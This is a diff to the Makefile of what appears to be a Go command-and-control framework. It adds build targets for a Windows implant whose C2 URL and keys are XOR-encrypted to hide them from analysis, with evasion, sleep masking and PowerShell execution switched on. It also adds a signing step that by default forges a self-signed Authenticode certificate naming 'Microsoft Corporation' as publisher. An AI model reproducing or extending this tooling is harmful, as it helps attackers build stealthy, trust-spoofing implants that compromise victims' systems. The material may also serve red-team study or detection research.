@@ -5,6 +5,7 @@ BINARY_DIR   := bin
 SERVER_BIN   := $(BINARY_DIR)/server
 OPERATOR_BIN := $(BINARY_DIR)/operator
 GENERATE_BIN := $(BINARY_DIR)/generate
+STRENC_BIN   := $(BINARY_DIR)/strenc
 AGENT_DIR    := ./agent
 
 # Default C2 server (override via env or CLI)
@@ -13,7 +14,13 @@ ENC_KEY     ?= SpookyOrcaC2AES1
 SEC_KEY     ?= TaburtuaiSecondary
 INTERVAL    ?= 30
 JITTER      ?= 20
-KILL_DATE   ?=
+KILL_DATE    ?=
+PROFILE      ?= default
+FRONT_DOMAIN ?=
+
+# Compile-time string encryption (agent-win-encrypted target)
+# XOR_KEY: single byte as 2-digit hex (00–ff). Default: 5a
+XOR_KEY     ?= 5a
 
 # Build flags
 GO          := go
@@ -22,13 +29,15 @@ LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
                 -X main.encKey=$(ENC_KEY) \
                 -X main.secondaryKey=$(SEC_KEY) \
                 -X main.defaultInterval=$(INTERVAL) \
-                -X main.defaultJitter=$(JITTER)
+                -X main.defaultJitter=$(JITTER) \
+                -X main.defaultProfile=$(PROFILE) \
+                -X main.defaultFrontDomain=$(FRONT_DOMAIN)
 
 LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
 LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui
 
-.PHONY: all server operator generate agent-windows agent-linux agent-darwin \
-        agent-win-stealth agent-win-garble stager deps clean help
+.PHONY: all server operator generate strenc agent-windows agent-linux agent-darwin \
+        agent-win-stealth agent-win-garble agent-win-encrypted stager deps clean help sign
 
 ## ── Default ──────────────────────────────────────────────────────────────────
 
@@ -50,6 +59,11 @@ generate: ## Build implant generator CLI
 	@mkdir -p $(BINARY_DIR)
 	$(GO) build -o $(GENERATE_BIN) ./cmd/generate
 	@echo "[+] Generator: $(GENERATE_BIN)"
+
+strenc: ## Build string encryption helper (used internally by agent-win-encrypted)
+	@mkdir -p $(BINARY_DIR)
+	$(GO) build -o $(STRENC_BIN) ./cmd/strenc
+	@echo "[+] strenc: $(STRENC_BIN)"
 
 stager: ## Build Windows stager binary (use generate cmd for production)
 	@mkdir -p $(BINARY_DIR)
@@ -101,6 +115,32 @@ agent-win-garble: ## Build Windows agent with garble obfuscation (needs garble i
 		$(AGENT_DIR)
 	@echo "[+] Windows garble: $(BINARY_DIR)/agent_windows_obf.exe"
 
+agent-win-encrypted: strenc ## Build Windows stealth agent with XOR-encrypted build strings
+	$(eval ENC_SERVER := $(shell $(STRENC_BIN) enc "$(C2_SERVER)" $(XOR_KEY)))
+	$(eval ENC_ENCKEY := $(shell $(STRENC_BIN) enc "$(ENC_KEY)" $(XOR_KEY)))
+	$(eval ENC_SECKEY := $(shell $(STRENC_BIN) enc "$(SEC_KEY)" $(XOR_KEY)))
+	@mkdir -p $(BINARY_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "-s -w -H windowsgui \
+			-X main.serverURLEnc=$(ENC_SERVER) \
+			-X main.encKeyEnc=$(ENC_ENCKEY) \
+			-X main.secKeyEnc=$(ENC_SECKEY) \
+			-X main.xorKeyHex=$(XOR_KEY) \
+			-X main.defaultInterval=$(INTERVAL) \
+			-X main.defaultJitter=$(JITTER) \
+			-X main.defaultProfile=$(PROFILE) \
+			-X main.defaultFrontDomain=$(FRONT_DOMAIN) \
+			-X main.defaultExecMethod=powershell \
+			-X main.defaultEnableEvasion=true \
+			-X main.defaultSleepMasking=true \
+			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
+		-o $(BINARY_DIR)/agent_windows_enc.exe \
+		$(AGENT_DIR)
+	@echo "[+] Encrypted agent: $(BINARY_DIR)/agent_windows_enc.exe"
+	@echo "    C2 URL (encrypted): $(ENC_SERVER)  [key=$(XOR_KEY)]"
+	@echo "    No plaintext strings in binary for C2 URL / AES keys"
+
 agent-linux: ## Build Linux agent
 	@mkdir -p $(BINARY_DIR)
 	GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
@@ -146,6 +186,34 @@ agent-custom: ## Build Windows agent with custom parameters (see Makefile header
 	@echo "    Interval: $(INTERVAL)s / jitter: $(JITTER)%"
 	@echo "    Kill    : $(KILL_DATE)"
 
+## ── Signing ──────────────────────────────────────────────────────────────────
+
+# Usage:
+#   make sign BINARY=bin/agent_windows_enc.exe
+#   make sign BINARY=bin/agent_windows_enc.exe SIGN_PUBLISHER="Microsoft Corp" SIGN_CERT=my.pfx
+SIGN_BINARY    ?=
+SIGN_PUBLISHER ?= Microsoft Corporation
+SIGN_CERT      ?=
+SIGN_PASS      ?= taburtuai
+
+sign: ## Sign a Windows PE binary with a self-signed Authenticode cert
+	@test -n "$(SIGN_BINARY)" || (echo "[-] Usage: make sign BINARY=path/to/agent.exe" && exit 1)
+	@mkdir -p $(BINARY_DIR)
+	$(GO) run ./cmd/sign \
+		--binary "$(SIGN_BINARY)" \
+		$(if $(SIGN_CERT),--cert "$(SIGN_CERT)",) \
+		--password "$(SIGN_PASS)" \
+		--publisher "$(SIGN_PUBLISHER)"
+	@echo "[+] Signing complete: $(SIGN_BINARY)"
+
+sign-cert: ## Generate a self-signed PFX cert only (no binary)
+	$(GO) run ./cmd/sign \
+		--gen-cert \
+		--publisher "$(SIGN_PUBLISHER)" \
+		--password "$(SIGN_PASS)" \
+		--out $(BINARY_DIR)/sign.pfx
+	@echo "[+] Cert: $(BINARY_DIR)/sign.pfx  (password: $(SIGN_PASS))"
+
 ## ── Utilities ────────────────────────────────────────────────────────────────
 
 deps: ## Download and tidy Go modules
@@ -185,8 +253,10 @@ help: ## Show this help
 	@echo "  \033[33mKILL_DATE\033[0m   Kill date YYYY-MM-DD (empty = never)"
 	@echo "  \033[33mWORK_START\033[0m  Working hours start  (0-23)"
 	@echo "  \033[33mWORK_END\033[0m    Working hours end    (0-23)"
+	@echo "  \033[33mXOR_KEY\033[0m     XOR byte (2-digit hex, default: 5a) for agent-win-encrypted"
 	@echo ""
 	@echo "  Examples:"
 	@echo "  \033[2mmake agent-win-stealth C2_SERVER=http://192.168.1.10:8080 ENC_KEY=MyKey1234567890 KILL_DATE=2026-12-31\033[0m"
 	@echo "  \033[2mmake agent-custom C2_SERVER=https://c2.domain.com INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18\033[0m"
+	@echo "  \033[2mmake agent-win-encrypted C2_SERVER=https://c2.domain.com ENC_KEY=MyKey1234567890 XOR_KEY=a3\033[0m"
 	@echo ""
